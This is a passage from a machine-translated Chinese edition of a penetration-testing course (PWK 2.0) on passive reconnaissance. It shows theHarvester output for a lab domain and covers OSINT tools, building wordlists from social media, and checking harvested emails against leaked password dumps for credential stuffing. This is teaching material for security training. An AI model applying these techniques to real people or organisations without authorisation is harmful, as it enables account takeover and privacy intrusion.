<div style="position:absolute;top:195245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来指定目标域和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-b</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来设置数据</font></font></nobr></div>
<div style="position:absolute;top:195265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索来源：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:195300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">theharvester -d megacorpone.com -b 谷歌</font></font></font></b></nobr></div>
<div style="position:absolute;top:195317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:195334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 开始域的收获过程：megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:195367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 在 Google 中搜索：</font></font></nobr></div>
<div style="position:absolute;top:195385;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在搜索 0 个结果...</font></font></nobr></div>
<div style="position:absolute;top:195402;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在搜索 100 个结果...</font></font></nobr></div>
<div style="position:absolute;top:195418;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在搜索 200 个结果...</font></font></nobr></div>
<div style="position:absolute;top:195435;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在搜索 300 个结果...</font></font></nobr></div>
<div style="position:absolute;top:195452;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在搜索 400 个结果...</font></font></nobr></div>
<div style="position:absolute;top:195469;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在搜索 500 个结果...</font></font></nobr></div>
<div style="position:absolute;top:195503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收获成果</font></font></nobr></div>
<div style="position:absolute;top:195520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未找到 IP 地址</font></font></nobr></div>
<div style="position:absolute;top:195571;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 找到的电子邮件：</font></font></nobr></div>
<div style="position:absolute;top:195588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------------</font></font></nobr></div>
<div style="position:absolute;top:195605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">joe@megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:195622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mcarlow@megacorpone.com</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:195639;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">first@megacorpone.com</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:195673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 在搜索引擎中找到的主机：</font></font></nobr></div>
<div style="position:absolute;top:195690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---------------------</font></font></nobr></div>
<div style="position:absolute;top:195724;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机总数：13</font></font></nobr></div>
<div style="position:absolute;top:195758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 正在解析主机名 IPs... </font></font></nobr></div>
<div style="position:absolute;top:195792;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ns1.megacorpone.com:38.100.193.70</font></font></nobr></div>
<div style="position:absolute;top:195809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Siem.megacorpone.com:38.100.193.89</font></font></nobr></div>
<div style="position:absolute;top:195826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">admin.megacorpone.com:38.100.193.83</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:195843;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">beta.megacorpone.com:38.100.193.88</font></font></b></nobr></div>
<div style="position:absolute;top:195859;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fs1.megacorpone.com:38.100.193.82</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:195877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内网.megacorpone.com:38.100.193.87</font></font></nobr></div>
<div style="position:absolute;top:195894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mail.megacorpone.com:38.100.193.84</font></font></nobr></div>
<div style="position:absolute;top:195911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mail2.megacorpone.com:38.100.193.73</font></font></nobr></div>
<div style="position:absolute;top:195928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns1.megacorpone.com:38.100.193.70</font></font></nobr></div>
<div style="position:absolute;top:195944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns2.megacorpone.com:38.100.193.80</font></font></nobr></div>
<div style="position:absolute;top:195961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">url.megacorpone.com：空</font></font></nobr></div>
<div style="position:absolute;top:195978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www.megacorpone.com:38.100.193.76</font></font></nobr></div>
<div style="position:absolute;top:195996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www2.megacorpone.com:38.100.193.79</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:196067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">177 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Christian Martorella, 2019)，https://github.com/laramies/theHarvester</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:196195;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="166"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 166 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:196228;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:197305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:197305;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:197305;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">166</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:196324;left:295"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 209 - 在 megacorpone.com 上运行 theHarvester</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:196353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们发现了一些电子邮件地址，其中一个“first@megacorpone.com”似乎是新的</font></font></nobr></div>
<div style="position:absolute;top:196372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们。</font><font style="vertical-align: inherit;">我们还发现了 megacorpone.com 的一些新子域。</font><font style="vertical-align: inherit;">让我们将这些添加到我们的笔记中</font></font></nobr></div>
<div style="position:absolute;top:196392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及。</font></font></nobr></div>
<div style="position:absolute;top:196425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是一个很好的提醒，信息收集并不总是一个整洁的线性过程。</font><font style="vertical-align: inherit;">我们可能是</font></font></nobr></div>
<div style="position:absolute;top:196444;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">寻找有关用户的信息并找到有关我们目标的其他信息。</font><font style="vertical-align: inherit;">这是原因之一</font></font></nobr></div>
<div style="position:absolute;top:196463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保持良好的笔记很重要。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:196498;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.12.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:196528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 theHarvester 枚举 megacorpone.com 的电子邮件地址。</font></font></nobr></div>
<div style="position:absolute;top:196556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 试验不同的数据源 (-b)。</font><font style="vertical-align: inherit;">哪些最适合你？</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:196590;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.12.2</font></font></i></nobr></div>
<div style="position:absolute;top:196590;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码转储</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:196628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">恶意黑客经常在 Pastebin 或其他信誉不佳的网站上倾倒泄露的凭据</font></font></nobr></div>
<div style="position:absolute;top:196648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网站。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">178</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些密码转储对于生成单词表非常有价值。</font><font style="vertical-align: inherit;">为了</font></font></nobr></div>
<div style="position:absolute;top:196667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，卡利Linux包括在2009年从数据破坏所产生的“RockYou的”单词表</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">179</font></font></font></nobr></div>
<div style="position:absolute;top:196700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据密码转储检查我们在用户枚举期间找到的电子邮件地址可以</font></font></nobr></div>
<div style="position:absolute;top:196719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开我们可以在凭证填充攻击中使用的密码。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:196757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.13 社交媒体工具</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:196798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">几乎所有组织现在都在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">社交媒体</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上保持某种形式的存在</font><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">180</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font></nobr></div>
<div style="position:absolute;top:196818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公司发布的信息对我们非常有用。</font><font style="vertical-align: inherit;">例如，我们可以使用这些信息</font></font></nobr></div>
<div style="position:absolute;top:196837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">识别潜在员工并获取有关公司及其运营的更多信息。</font></font></nobr></div>
<div style="position:absolute;top:196856;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有多种方法可以使用我们已有的几种工具来收集这些公共信息</font></font></nobr></div>
<div style="position:absolute;top:196876;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">讨论过，例如侦察和收割机。</font><font style="vertical-align: inherit;">让我们探索一些其他工具。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:196910;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.13.1.1 社交搜索者</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:196944;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Social-Searcher </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">181</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是社交媒体网站的搜索引擎。</font><font style="vertical-align: inherit;">免费帐户将允许有限的</font></font></nobr></div>
<div style="position:absolute;top:196964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每天的搜索次数。</font><font style="vertical-align: inherit;">Social-searcher 可以快速替代设置 API 密钥</font></font></nobr></div>
<div style="position:absolute;top:196983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多种更专业的服务。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:197195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">178 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（特洛伊亨特，2019 年），https://haveibeenpwned.com/PwnedWebsites</font></font></font></nobr></div>
<div style="position:absolute;top:197215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">179 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/RockYou#Data_breach</font></font></font></nobr></div>
<div style="position:absolute;top:197235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">180 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/Social_media</font></font></font></nobr></div>
<div style="position:absolute;top:197255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">181 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（社交搜索者，2019 年），https://www.social-searcher.com</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:197383;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="167"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 167 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:197416;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:198493;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:198493;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:198493;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">167</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:197864;left:367"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 40：使用社交搜索器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:197895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索结果将包括目标组织发布的信息以及人员</font></font></nobr></div>
<div style="position:absolute;top:197914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说到这。</font><font style="vertical-align: inherit;">除其他外，这可以帮助我们确定什么样的足迹和覆盖范围</font></font></nobr></div>
<div style="position:absolute;top:197934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个组织在社交媒体上有。</font><font style="vertical-align: inherit;">完成此操作后，我们可以选择继续使用</font></font></nobr></div>
<div style="position:absolute;top:197953;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于站点的工具。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:197988;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.13.2</font></font></i></nobr></div>
<div style="position:absolute;top:197988;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于站点的工具</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:198026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可能需要熟悉两种特定于站点的工具。</font></font></nobr></div>
<div style="position:absolute;top:198058;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Twofi </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">182</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描用户的 Twitter 提要并生成用于密码的个性化词表</font></font></nobr></div>
<div style="position:absolute;top:198078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对该用户的攻击。</font><font style="vertical-align: inherit;">虽然我们不会在被动信息收集期间进行任何攻击，</font></font></nobr></div>
<div style="position:absolute;top:198097;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以针对我们已确定准备好词表的任何 Twitter 帐户运行此工具</font></font></nobr></div>
<div style="position:absolute;top:198117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要。</font><font style="vertical-align: inherit;">Twofi 需要有效的 Twitter API 密钥。</font></font></nobr></div>
<div style="position:absolute;top:198149;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">linkedin2username </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">183</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个脚本，用于根据 LinkedIn 数据生成用户名列表。</font><font style="vertical-align: inherit;">这个需要</font></font></nobr></div>
<div style="position:absolute;top:198168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效的 LinkedIn 凭据，取决于与目标中个人的 LinkedIn 连接</font></font></nobr></div>
<div style="position:absolute;top:198188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织。</font><font style="vertical-align: inherit;">该脚本将以几种不同的格式输出用户名。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:198222;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.13.2.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:198252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用之前讨论过的任何社交媒体工具来识别其他 MegaCorp One</font></font></nobr></div>
<div style="position:absolute;top:198272;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">雇员。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:198423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">182 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（罗宾伍德，2019 年），https://digi.ninja/projects/twofi.php</font></font></font></nobr></div>
<div style="position:absolute;top:198443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">183 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(initstring, 2019), https://github.com/initstring/linkedin2username</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:198571;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="168"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 168 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:198604;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:199681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:199681;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:199681;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">168</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:198700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.14 堆栈溢出</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:198742;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Stack Overflow </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">184</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个供开发人员提问和回答编码相关问题的网站。</font></font></nobr></div>
<div style="position:absolute;top:198774;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从信息收集的角度来看，该站点的价值在于查看问题的类型</font></font></nobr></div>
<div style="position:absolute;top:198793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">给定的用户正在询问或回答。</font><font style="vertical-align: inherit;">如果我们可以合理地确定 Stack Overflow 上的用户也是</font></font></nobr></div>
<div style="position:absolute;top:198813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们目标组织的一名员工，我们或许能够推断出一些关于该组织的事情</font></font></nobr></div>
<div style="position:absolute;top:198832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据员工的问题和答案。</font></font></nobr></div>
<div style="position:absolute;top:198865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，如果我们发现一个用户总是在询问和回答有关 Python 的问题，它</font></font></nobr></div>
<div style="position:absolute;top:198884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">假设他们每天都使用该编程语言是合理的，并且</font></font></nobr></div>
<div style="position:absolute;top:198904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能会在他们受雇的组织中使用。</font></font></nobr></div>
<div style="position:absolute;top:198937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更糟糕的是，如果我们发现员工讨论敏感信息，例如漏洞</font></font></nobr></div>
<div style="position:absolute;top:198956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修复这些类型的论坛，我们可以在此期间发现未修补的漏洞</font></font></nobr></div>
<div style="position:absolute;top:198975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阶段。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:199013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.15 信息收集框架</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:199054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将通过简要提及两个额外的工具来结束这个模块，这些工具包含了许多</font></font></nobr></div>
<div style="position:absolute;top:199073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们讨论过的技术并添加了额外的功能。</font><font style="vertical-align: inherit;">这些工具一般太</font></font></nobr></div>
<div style="position:absolute;top:199093;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于我们将在实验室中进行的工作来说很繁重，但它们在实际评估中很有价值。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:199127;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.15.1</font></font></i></nobr></div>
<div style="position:absolute;top:199127;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开源情报框架</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:199165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OSINT框架</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">185</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括信息收集工具，并在一个中心位置的网站。</font></font></nobr></div>
<div style="position:absolute;top:199185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">框架中列出的一些工具涵盖的学科比信息安全更多。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:199611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">184 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Stack Exchange，2019 年），https://stackoverflow.com/</font></font></font></nobr></div>
<div style="position:absolute;top:199631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">185 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（贾斯汀·诺丁，2019 年，https://osintframework.com/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:199759;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="169"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 169 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:199792;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:200869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:200869;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:200869;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">169</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:200286;left:376"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 41：开源情报框架</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:200318;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OSINT 框架并不是一个清单，而是审查类别和可用的</font></font></nobr></div>
<div style="position:absolute;top:200337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具可能会激发更多信息收集机会的想法。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:200371;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.15.2</font></font></i></nobr></div>
<div style="position:absolute;top:200371;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">马尔特哥</font></font></i></nobr></div>
</span></font>
